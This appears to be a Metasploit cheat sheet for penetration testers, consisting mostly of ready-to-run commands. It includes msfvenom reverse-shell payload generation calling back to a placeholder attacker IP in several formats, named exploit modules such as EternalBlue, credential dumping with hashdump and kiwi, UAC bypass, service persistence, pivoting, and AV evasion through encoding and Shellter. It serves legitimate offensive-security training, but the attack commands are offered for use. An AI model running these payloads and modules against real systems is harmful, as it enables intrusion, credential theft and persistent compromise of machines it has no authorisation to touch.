# Metasploit & Payloads Cheat Sheet

Core framework usage, Meterpreter, and `msfvenom` payload generation.

## Core workflow

```bash
sudo msfdb init
service postgresql start && msfconsole -q

db_status
workspace -a <NAME>
setg RHOSTS <TARGET_IP>          # applies to every module until unset

search <STRING>
search cve:2017 type:exploit platform:windows
use <MODULE_PATH>
show options
set <OPTION> <VALUE>
run   # or: exploit
```

```bash
sessions                    # list
sessions 1                  # interact
sessions -u 1                # upgrade shell -> Meterpreter
sessions -k 1                 # kill one / sessions -K for all

# Import existing scan data
nmap -Pn -sV -O <TARGET_IP> -oX scan.xml
db_import scan.xml
hosts ; services ; vulns
```

## Meterpreter essentials

```
getuid ; sysinfo ; getprivs
ps ; migrate <PID>
hashdump
lpwd ; lcd <local_dir> ; download <remote> ; upload <local>
shell                 # drop to native OS shell
background            # or CTRL+Z
```

## msfvenom payload generation

```bash
msfvenom --list payloads

# Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o payload.exe
msfvenom -p windows/shell/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx > shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw > shell.php

# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f elf -o payload

# Format-specific: MSI (AlwaysInstallElevated), DLL (hijacking)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi > payload.msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll > payload.dll

# Encoded (weak AV evasion at best — don't rely on this alone)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

> **Common mistake to avoid:** `LHOST` is always *your* attacking machine, not
> the target. The same applies to any file-serving IP in `certutil`/`iwr`
> download commands run *on* the target — it should point back at you.

## Staged vs non-staged

```
windows/x64/meterpreter/reverse_tcp          # staged
windows/x64/meterpreter_reverse_https        # non-staged
```
Staged payloads need a matching `multi/handler`; non-staged are self-contained
but larger.

## Exploitation examples

```bash
use exploit/windows/smb/ms17_010_eternalblue        # EternalBlue
use exploit/windows/http/rejetto_hfs_exec            # HFS (Rejetto)
use exploit/multi/samba/usermap_script                # Samba usermap_script
use exploit/unix/ftp/vsftpd_234_backdoor              # vsftpd 2.3.4 backdoor
use exploit/windows/winrm/winrm_script_exec           # WinRM (needs valid creds)
use exploit/multi/http/apache_normalize_path_rce      # Apache 2.4.49/50 path traversal
```

## Post-exploitation modules (a sample)

```bash
# Windows
use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
use post/multi/manage/shell_to_meterpreter
use exploit/windows/local/bypassuac_injection
use post/windows/local/persistence_service

# Credential dumping (Meterpreter)
load kiwi
creds_all ; creds_msv ; lsa_dump_sam ; lsa_dump_secrets

# Linux
use post/linux/gather/enum_system
use post/linux/gather/hashdump
use post/multi/recon/local_exploit_suggester
```

## Pivoting through Metasploit

```bash
run autoroute -s <TARGET1_SUBNET>
background
use auxiliary/scanner/portscan/tcp
set RHOSTS <TARGET2_IP>
run

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1 ; set VERSION 5
run -j
# then: proxychains <tool> against TARGET2

portfwd add -l <LOCAL_PORT> -p <TARGET2_PORT> -r <TARGET2_IP>
```

## AV evasion (Shellter — weak, not a real bypass against modern EDR)

```bash
sudo apt install shellter wine -y
shellter
# Operation Mode: A, provide PE target, Stealth Mode: Y, choose a payload, set LHOST/LPORT
```
